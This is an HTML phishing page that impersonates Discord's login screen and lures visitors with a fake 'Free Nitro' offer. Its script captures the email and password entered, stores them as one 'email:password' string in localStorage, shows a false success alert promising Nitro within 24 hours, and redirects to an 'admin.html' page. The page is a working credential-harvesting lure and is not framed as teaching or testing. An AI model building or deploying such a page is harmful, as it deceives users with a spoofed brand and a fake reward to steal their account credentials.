<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord - Log In</title>
    <link rel="icon" type="image/png" href="logo1.png">
    <style>
        body {
            background: url('bg.png') no-repeat center center fixed;
            background-size: cover;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            position: relative;
        }
        .login-container {
            background-color: rgba(47, 49, 54, 0.85);
            padding: 24px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
            width: 380px;
            text-align: center;
        }
        .login-container h1 {
            margin-bottom: 20px;
            font-size: 24px;
            font-weight: bold;
        }
        .login-container p {
            margin-bottom: 20px;
            color: #b9bbbe;
        }
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #b9bbbe;
            font-size: 14px;
            font-weight: bold;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            background-color: #202225;
            border: 1px solid #292b2f;
            border-radius: 3px;
            color: #dcddde;
            font-size: 14px;
        }
        .submit-btn {
            background-color: #5865f2;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-size: 14px;
            width: 100%;
            margin-top: 10px;
        }
        .submit-btn:hover {
            background-color: #4752c4;
        }
        .login-footer {
            margin-top: 20px;
            color: #b9bbbe;
            font-size: 12px;
        }
        .login-footer a {
            color: #5865f2;
            text-decoration: none;
        }
        .login-footer a:hover {
            text-decoration: underline;
        }
        .logo {
            position: absolute;
            top: 9px;
            left: 9px;
        }
        .offer-text {
            color: rgb(212, 0, 0);
            font-size: 14px;
            transform: rotate(-3deg);
            position: absolute;
            bottom: 10px;
            left: 20px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% {
                transform: scale(0.95);
            }
            50% {
                transform: scale(1.05);
            }
            100% {
                transform: scale(0.95);
            }
        }
    </style>
</head>
<body>
    <img src="logo.png" alt="Logo" class="logo" height="60">
    <div class="login-container">
        <h1>Welcome back!</h1>
        <p>We're so excited to see you again! Free Nitro Offer</p>
        <p class="offer-text">100% off Free Nitro</p>
        <form id="loginForm">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="submit-btn">Log In</button>
        </form>
        <div class="login-footer">
            <p>Need an account? <a href="#">Register</a></p>
            <p>Forgot your password? <a href="#">Reset Password</a></p>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Combine email and password into a single string
            const userData = `${email}:${password}`;

            // Save to localStorage
            localStorage.setItem('userData', userData);

            // Display success message
            alert('Successful! The Nitro will be sent to your email (under 24hr).');

            // Clear the form
            document.getElementById('loginForm').reset();

            // Redirect to the admin page
            window.location.href = "admin.html";
        });
    </script>
</body>
</html>
